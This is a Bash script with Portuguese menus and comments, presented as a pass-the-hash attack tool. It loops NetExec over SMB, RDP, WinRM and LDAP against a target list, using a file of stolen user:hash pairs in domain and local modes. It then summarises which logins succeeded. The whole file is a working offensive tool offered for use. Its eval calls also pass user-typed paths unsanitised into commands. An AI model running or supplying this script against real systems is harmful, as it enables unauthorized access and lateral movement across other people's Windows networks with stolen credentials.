#!/bin/bash

# --- Cores para o output ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # Sem Cor
# ---------------------------

# Variável global para a contagem sequencial
ACTION_COUNT=1

# Lista de protocolos a serem testados
PROTOCOLS=(smb rdp winrm ldap)

# --- Funções de Execução do Pass-the-Hash ---

execute_pth_domain() {
    local TARGETS_FILE=$1
    local DOMAIN=$2
    local HASH_FILE=$3
    local LOG_FILE=$4

    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando PASS-THE-HASH (DOMÍNIO) em múltiplos protocolos...${NC}" | tee -a "$LOG_FILE"

    for proto in "${PROTOCOLS[@]}"; do
        echo "" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Testando DOMÍNIO (PTH) para protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        eval "unbuffer nxc $proto '$TARGETS_FILE' -u '$HASH_FILE' -H '$HASH_FILE' -d '$DOMAIN' --continue-on-success" | tee -a "$LOG_FILE"
    done
}

execute_pth_local() {
    local TARGETS_FILE=$1
    local HASH_FILE=$2
    local LOG_FILE=$3

    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando PASS-THE-HASH (LOCAL) em múltiplos protocolos...${NC}" | tee -a "$LOG_FILE"

    for proto in "${PROTOCOLS[@]}"; do
        if [ "$proto" == "ldap" ]; then continue; fi
        echo "" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Testando LOCAL (PTH) para protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        eval "unbuffer nxc $proto '$TARGETS_FILE' -u '$HASH_FILE' -H '$HASH_FILE' --local-auth --continue-on-success" | tee -a "$LOG_FILE"
    done
}

# --- Funções Auxiliares e de Menu ---

display_summary() {
    local LOG_FILE=$1
    echo -e "\n================================================="
    echo -e "${GREEN}        Resumo dos Acessos Válidos${NC}"
    echo -e "================================================="
    grep --color=always "\[+\]" "$LOG_FILE" | grep -v "Iniciando testes"
    echo -e "\n[*] Script finalizado."
}

# --- Função Principal que Gerencia a Coleta de Dados e a Execução ---
run_pth_manager() {
    local pth_type=$1 # "domain", "local", ou "full"

    echo -e "\nModo de Ataque Selecionado: Pass-the-Hash (${pth_type^^})"
    echo "-------------------------------------------------"
    read -p "Digite o caminho para o arquivo de ALVOS: " TARGETS_FILE
    if [ ! -f "$TARGETS_FILE" ]; then echo -e "${RED}Erro: Arquivo de alvos não encontrado.${NC}"; return; fi
    
    read -p "Digite o caminho para o arquivo de HASHES (formato usuario:hash): " HASH_FILE
    if [ ! -f "$HASH_FILE" ]; then echo -e "${RED}Erro: Arquivo de hashes não encontrado.${NC}"; return; fi

    local DOMAIN=""
    if [ "$pth_type" != "local" ]; then
        read -p "Digite o nome do DOMÍNIO: " DOMAIN
    fi

    local current_date=$(date +%Y-%m-%d)
    local sequence=$(printf "%02d" $ACTION_COUNT)
    local LOG_FILE="resultados_pth_${current_date}_${pth_type}_${sequence}.log"
    echo -e "\n${YELLOW}[*] Os resultados completos serão salvos em: ${GREEN}$LOG_FILE${NC}"
    echo -e "${YELLOW}[*] Pressione Enter para iniciar...${NC}"
    read

    if [ "$pth_type" == "domain" ]; then
        execute_pth_domain "$TARGETS_FILE" "$DOMAIN" "$HASH_FILE" "$LOG_FILE"
    elif [ "$pth_type" == "local" ]; then
        execute_pth_local "$TARGETS_FILE" "$HASH_FILE" "$LOG_FILE"
    elif [ "$pth_type" == "full" ]; then
        execute_pth_domain "$TARGETS_FILE" "$DOMAIN" "$HASH_FILE" "$LOG_FILE"
        execute_pth_local "$TARGETS_FILE" "$HASH_FILE" "$LOG_FILE"
    fi
    
    ((ACTION_COUNT++))
    display_summary "$LOG_FILE"
}

# --- Loop Principal do Menu ---
while true; do
    echo ""
    echo -e "${BLUE}"
cat << "EOF"
                      ____ ____  _____           __ _  ___                         
                     |  _ \___ \|  __ \         /_ | |/ _ \                        
            ___ _   _| |_) |__) | |__) |___  __ _| | | | | |_ __                   
           / __| | | |  _ <|__ <|  _  // __|/ _` | | | | | | '__|                  
          | (__| |_| | |_) |__) | | \ \\__ \ (_| | | | |_| | |                     
           \___|\__, |____/____/|_|  \_\___/\__,_|_|_|\___/|_|                     
          _____ __/ |          _______ _            _    _          _     
         |  __ \___/          |__   __| |           | |  | |        | |    
         | |__) |_ _ ___ ___     | |  | |__   ___   | |__| | __ _ __| |__  
         |  ___/ _` / __/ __|    | |  | '_ \ / _ \  |  __  |/ _` / __| '_ \ 
         | |  | (_| \__ \__ \    | |  | | | |  __/  | |  | | (_| \__ \ | | |
         |_|   \__,_|___/___/    |_|  |_| |_|\___|  |_|  |_|\__,_|___/_| |_|
                                                                             
EOF
    echo -e "${NC}"
    echo ""
    echo -e "${YELLOW}Ferramenta de Ataque Pass-the-Hash${NC}"
    echo "-------------------------------------------------"
    echo ""
    echo -e "${GREEN}1)${NC} PTH de Domínio"
    echo -e "${GREEN}2)${NC} PTH Local"
    echo -e "${YELLOW}3)${NC} PTH Completo (Domínio + Local)"
    echo -e "${RED}4)${NC} Sair"
    echo ""
    read -p "Escolha o tipo de ataque [1-4]: " choice

    case $choice in
        1) run_pth_manager "domain" ;;
        2) run_pth_manager "local" ;;
        3) run_pth_manager "full" ;;
        4) echo -e "${YELLOW}Saindo...${NC}"; exit 0 ;;
        *) echo -e "${RED}Opção inválida.${NC}" ;;
    esac

    echo ""
    read -p "Pressione [Enter] para retornar ao menu..."
done
